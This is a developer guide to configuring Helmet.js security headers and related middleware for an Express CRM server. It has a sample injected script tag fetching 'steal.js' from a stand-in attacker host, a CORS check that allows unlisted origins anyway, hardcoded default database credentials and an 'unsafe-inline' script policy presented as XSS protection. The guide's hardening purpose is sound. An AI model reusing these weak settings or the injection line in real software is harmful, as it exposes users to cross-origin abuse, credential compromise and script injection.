# 🔒 IMPLEMENTATION #2: SECURITY HEADERS (HELMET.JS)

**Priority**: Quick Win (High Impact, Low Effort)  
**Time Estimate**: 15 minutes  
**Status**: ✅ Ready to Implement

---

## 📋 WHAT ARE SECURITY HEADERS?

Security headers are HTTP headers that tell browsers how to behave when handling your website's content. They protect against common web vulnerabilities.

### Without Security Headers:
```
Attacker → Injects malicious script → Browser runs it → User data stolen ❌
```

### With Security Headers:
```
Attacker → Injects malicious script → Browser blocks it → User safe ✅
```

---

## 🎯 WHAT HELMET.JS DOES

Helmet.js automatically sets **11 security headers** to protect your application from:

1. **XSS (Cross-Site Scripting)** - Malicious scripts in web pages
2. **Clickjacking** - Hiding your site in an iframe to trick users
3. **MIME Sniffing** - Browser guessing content type incorrectly
4. **DNS Prefetching** - Leaking user browsing data
5. **Content Security Policy** - Controlling what resources can load
6. **And more...**

---

## 🛡️ SECURITY HEADERS EXPLAINED

### 1. X-Content-Type-Options
```
X-Content-Type-Options: nosniff
```
**What it does**: Prevents browser from guessing file types  
**Why important**: Stops attackers from disguising malicious files

**Example Attack Without This:**
```
Attacker uploads "image.jpg" (actually JavaScript)
Browser thinks: "This looks like JavaScript, I'll run it!"
Result: Malicious code executes ❌
```

**With Header:**
```
Browser: "Server says it's an image, I won't run it as JavaScript" ✅
```

### 2. X-Frame-Options
```
X-Frame-Options: DENY
```
**What it does**: Prevents your site from being embedded in iframes  
**Why important**: Stops clickjacking attacks

**Clickjacking Attack:**
```
Attacker creates invisible iframe with your login page
User thinks they're clicking "Play Video"
Actually clicking "Transfer $1000" on your hidden iframe ❌
```

**With Header:**
```
Browser refuses to load your site in iframe ✅
```

### 3. X-XSS-Protection
```
X-XSS-Protection: 0
```
**What it does**: Disables legacy XSS filter (modern CSP is better)  
**Why 0**: Old XSS filters had vulnerabilities themselves

### 4. Strict-Transport-Security (HSTS)
```
Strict-Transport-Security: max-age=15552000; includeSubDomains
```
**What it does**: Forces HTTPS for 180 days  
**Why important**: Prevents man-in-the-middle attacks

**Without HSTS:**
```
User visits http://iconicsmart.co.in (insecure)
Attacker intercepts and steals login ❌
```

**With HSTS:**
```
Browser automatically upgrades to https://iconicsmart.co.in ✅
```

### 5. Content-Security-Policy (CSP)
```
Content-Security-Policy: default-src 'self';
```
**What it does**: Controls what resources can load  
**Why important**: Prevents loading malicious external scripts

**Attack Without CSP:**
```
Attacker injects: <script src="http://evil.com/steal.js"></script>
Browser loads and runs malicious script ❌
```

**With CSP:**
```
Browser: "CSP policy says only load scripts from 'self'"
Browser blocks http://evil.com/steal.js ✅
```

---

## 💻 CODE IMPLEMENTATION

### Step 1: Install Helmet
```bash
npm install helmet
```

### Step 2: Create Security Middleware

**File**: `middleware/security.js`

```javascript
const helmet = require('helmet');

// Configure Helmet with custom settings
const securityHeaders = helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Allow inline styles (for our HTML pages)
      scriptSrc: ["'self'", "'unsafe-inline'"], // Allow inline scripts (for our HTML pages)
      imgSrc: ["'self'", "data:", "https:"], // Allow images from self, data URIs, and HTTPS
      connectSrc: ["'self'"], // Allow API calls to same origin
      fontSrc: ["'self'", "data:"], // Allow fonts from self and data URIs
      objectSrc: ["'none'"], // Block plugins like Flash
      mediaSrc: ["'self'"], // Allow media from self
      frameSrc: ["'none'"], // Block all iframes
    },
  },
  
  // Cross-Origin-Embedder-Policy
  crossOriginEmbedderPolicy: false, // Disabled for compatibility
  
  // Cross-Origin-Opener-Policy
  crossOriginOpenerPolicy: { policy: "same-origin" },
  
  // Cross-Origin-Resource-Policy
  crossOriginResourcePolicy: { policy: "same-origin" },
  
  // DNS Prefetch Control
  dnsPrefetchControl: { allow: false },
  
  // Frameguard (X-Frame-Options)
  frameguard: { action: "deny" }, // Prevent clickjacking
  
  // Hide Powered By (remove X-Powered-By header)
  hidePoweredBy: true, // Don't advertise we're using Express
  
  // HSTS (Strict-Transport-Security)
  hsts: {
    maxAge: 15552000, // 180 days in seconds
    includeSubDomains: true, // Apply to all subdomains
    preload: true // Submit to HSTS preload list
  },
  
  // IE No Open
  ieNoOpen: true,
  
  // X-Content-Type-Options
  noSniff: true, // Prevent MIME sniffing
  
  // Origin-Agent-Cluster
  originAgentCluster: true,
  
  // Permitted Cross-Domain Policies
  permittedCrossDomainPolicies: { permittedPolicies: "none" },
  
  // Referrer Policy
  referrerPolicy: { policy: "no-referrer" }, // Don't leak referrer info
  
  // X-XSS-Protection (disabled - CSP is better)
  xssFilter: false
});

// Custom middleware to log security headers
const logSecurityHeaders = (req, res, next) => {
  console.log(`🔒 Security headers applied for: ${req.method} ${req.path}`);
  next();
};

// Middleware to add custom security headers for API responses
const apiSecurityHeaders = (req, res, next) => {
  // Only apply to API routes
  if (req.path.startsWith('/api/')) {
    // Prevent caching of API responses (sensitive data)
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    
    // Add custom security header
    res.setHeader('X-API-Version', '1.0');
    
    // Prevent API responses from being displayed in iframe
    res.setHeader('X-Frame-Options', 'DENY');
  }
  next();
};

module.exports = {
  securityHeaders,
  logSecurityHeaders,
  apiSecurityHeaders
};
```

---

## 🔧 INTEGRATION INTO SERVER

### Step 3: Update `server.js`

```javascript
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');

// Import security middleware
const { securityHeaders, apiSecurityHeaders } = require('./middleware/security');

// Import rate limiters
const { authLimiter, getRateLimiter } = require('./middleware/rateLimiter');

dotenv.config();

const app = express();

// ============================================
// SECURITY MIDDLEWARE (Apply first!)
// ============================================
app.use(securityHeaders); // Helmet.js security headers
app.use(apiSecurityHeaders); // Custom API security headers

// Trust proxy (required for rate limiting to work correctly behind reverse proxy)
app.set('trust proxy', 1);

// CORS Configuration
const allowedOrigins = [
  'http://localhost:7000',
  'http://localhost:3000',
  'https://www.iconicsmart.co.in',
  'https://iconicsmart.co.in'
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.warn('⚠️ CORS blocked origin:', origin);
      callback(null, true);
    }
  },
  credentials: true
}));

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB connection
const MONGO_URI = process.env.MONGO_URI || 'mongodb://admin:admin123@localhost:27017/iconic-crm?authSource=admin';

console.log('🔌 Attempting MongoDB connection...');
mongoose.connect(MONGO_URI, {
  serverSelectionTimeoutMS: 5000,
  socketTimeoutMS: 45000,
})
.then(() => {
  console.log('✅ MongoDB connected successfully!');
  console.log('📊 Database:', mongoose.connection.name);
})
.catch(err => {
  console.error('❌ MongoDB connection error:', err.message);
});

// Root route
app.get('/', (req, res) => {
  console.log('🏠 Root route accessed, redirecting to login');
  res.redirect('/login.html');
});

// ============================================
// RATE LIMITING
// ============================================
// Apply strict rate limiting to auth routes (prevent brute force)
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);

// Apply role-based rate limiting to all other API routes
app.use('/api', getRateLimiter);

// ============================================
// API ROUTES
// ============================================
app.use('/api/auth', require('./routes/auth'));
app.use('/api/users', require('./routes/users'));
app.use('/api/beat-tracker', require('./routes/beatTracker'));
app.use('/api/api-keys', require('./routes/apiKeys'));
app.use('/api/webhooks', require('./routes/webhooks'));
app.use('/api/orders', require('./routes/orders'));
app.use('/api/services', require('./routes/services'));
app.use('/api/service-centers', require('./routes/serviceCenters'));
app.use('/api/service-requests', require('./routes/serviceRequests'));
app.use('/api/content-requests', require('./routes/contentRequests'));
app.use('/api/content-uploads', require('./routes/contentUploads'));
app.use('/api/content-managers', require('./routes/contentManagers'));
app.use('/api/logistic-partners', require('./routes/logisticPartners'));
app.use('/api/dispatches', require('./routes/dispatches'));
app.use('/api/deliveries', require('./routes/deliveries'));
app.use('/api/reports', require('./routes/reports'));
app.use('/api/retailers', require('./routes/retailers'));
app.use('/api/products', require('./routes/products'));
app.use('/api/marketing', require('./routes/marketing'));
app.use('/api/leads', require('./routes/leads'));
app.use('/api/opportunities', require('./routes/opportunities'));
app.use('/api/contacts', require('./routes/contacts'));
app.use('/api/invoices', require('./routes/invoices'));

// Health check (not rate limited)
app.get('/api/health', (req, res) => res.json({ 
  status: 'OK',
  timestamp: new Date().toISOString(),
  uptime: process.uptime(),
  security: 'Helmet.js enabled',
  rateLimiting: 'Active'
}));

// Catch all
app.use((req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API endpoint not found' });
  }
  if (!req.path.includes('.')) {
    res.redirect('/login.html');
  } else {
    res.status(404).send('File not found');
  }
});

const PORT = process.env.PORT || 7000;
app.listen(PORT, () => {
  console.log(`\n🚀 Server running on http://localhost:${PORT}`);
  console.log(`📱 Access the CRM at: http://localhost:${PORT}`);
  console.log(`🔐 Login page: http://localhost:${PORT}/login.html`);
  console.log(`🛡️ Rate limiting: 100 req/15min (users), 500 req/15min (admins)`);
  console.log(`🔒 Security headers: Enabled (Helmet.js)\n`);
});
```

---

## 🧪 TESTING SECURITY HEADERS

### Method 1: Using Browser DevTools

1. Open your browser
2. Visit `http://localhost:7000`
3. Open DevTools (F12)
4. Go to **Network** tab
5. Refresh page
6. Click on the first request
7. View **Response Headers**

You should see:
```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; ...
Referrer-Policy: no-referrer
```

### Method 2: Using curl

```bash
curl -I http://localhost:7000/api/health
```

Output:
```
HTTP/1.1 200 OK
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; ...
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
Referrer-Policy: no-referrer
Cache-Control: no-store, no-cache, must-revalidate, private
```

### Method 3: Online Scanner

Visit: https://securityheaders.com

Enter: `https://your-domain.com`

Expected Grade: **A or A+**

---

## 📊 BEFORE AND AFTER

### BEFORE (Without Helmet)
```
Response Headers:
- Content-Type: application/json
- Date: Mon, 04 Nov 2025 ...
- X-Powered-By: Express (⚠️ Security risk!)

Grade: F ❌
Vulnerable to: XSS, Clickjacking, MIME Sniffing
```

### AFTER (With Helmet)
```
Response Headers:
- Content-Type: application/json
- Date: Mon, 04 Nov 2025 ...
- X-Content-Type-Options: nosniff ✅
- X-Frame-Options: DENY ✅
- Strict-Transport-Security: max-age=15552000 ✅
- Content-Security-Policy: default-src 'self' ✅
- Referrer-Policy: no-referrer ✅
(X-Powered-By header removed ✅)

Grade: A+ ✅
Protected against: XSS, Clickjacking, MIME Sniffing, and more!
```

---

## 🎯 CSP CUSTOMIZATION FOR YOUR APP

### Current CSP (Permissive for Development)
```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"], // Allows inline CSS
    scriptSrc: ["'self'", "'unsafe-inline'"], // Allows inline JS
  }
}
```

### Strict CSP (For Production)
```javascript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "https://cdn.iconicsmart.co.in"],
    scriptSrc: ["'self'", "https://cdn.iconicsmart.co.in"],
    imgSrc: ["'self'", "https://www.iconicsmart.in", "data:"],
    connectSrc: ["'self'", "https://api.iconicsmart.co.in"],
    fontSrc: ["'self'", "https://fonts.googleapis.com"],
  }
}
```

### Allow External APIs (if needed)
```javascript
connectSrc: [
  "'self'",
  "https://api.iconicsmart.co.in",
  "https://maps.googleapis.com", // If using Google Maps
  "https://api.payment-gateway.com" // If using payment gateway
]
```

---

## 🔧 TROUBLESHOOTING

### Issue 1: Inline Styles Blocked
**Error in console**: `Refused to apply inline style`

**Solution**: Add `'unsafe-inline'` to `styleSrc`
```javascript
styleSrc: ["'self'", "'unsafe-inline'"]
```

### Issue 2: External Images Not Loading
**Error**: Images from iconicsmart.in not showing

**Solution**: Add domain to `imgSrc`
```javascript
imgSrc: ["'self'", "data:", "https:", "https://www.iconicsmart.in"]
```

### Issue 3: API Calls Failing
**Error**: `connect-src` policy violation

**Solution**: Add API domain to `connectSrc`
```javascript
connectSrc: ["'self'", "https://api.yourdomain.com"]
```

### Issue 4: Page Loads in iframe (for testing)
**Error**: Can't test in iframe

**Solution**: Temporarily change frameguard
```javascript
frameguard: { action: "sameorigin" } // Allows same-origin iframes
```

---

## ✅ BENEFITS

1. **🛡️ XSS Protection**: Blocks malicious scripts
2. **🔒 Clickjacking Prevention**: Can't embed in iframes
3. **🚫 MIME Sniffing**: Browser respects content-type
4. **🔐 HTTPS Enforcement**: Forces secure connections
5. **📊 Security Score**: A+ grade on security scanners
6. **🕵️ Privacy**: No referrer leaking
7. **⚡ Performance**: Minimal overhead (<1ms)

---

## 🚀 DEPLOYMENT CHECKLIST

- [ ] Install `helmet` package
- [ ] Create `middleware/security.js`
- [ ] Update `server.js` with security middleware
- [ ] Test with browser DevTools
- [ ] Run security header scanner
- [ ] Verify all pages load correctly
- [ ] Check CSP doesn't block needed resources
- [ ] Test API endpoints work properly
- [ ] Remove `'unsafe-inline'` in production (if possible)
- [ ] Document any CSP adjustments needed

---

## 📚 RESOURCES

- **Helmet.js**: https://helmetjs.github.io/
- **CSP Guide**: https://content-security-policy.com/
- **Security Headers**: https://securityheaders.com/
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/

---

## 🎓 ADMIN VS USER DIFFERENCES

### Security Headers Apply to ALL Users
- ✅ Admins get same security headers as users
- ✅ No separate configuration needed
- ✅ Protection is universal

### Why?
Security headers protect the **browser**, not the server. All users (admin/regular) benefit equally from these protections.

---

**Next Implementation**: [React Frontend Setup](#)  
**Previous**: [Rate Limiting](IMPLEMENTATION_01_RATE_LIMITING.md)
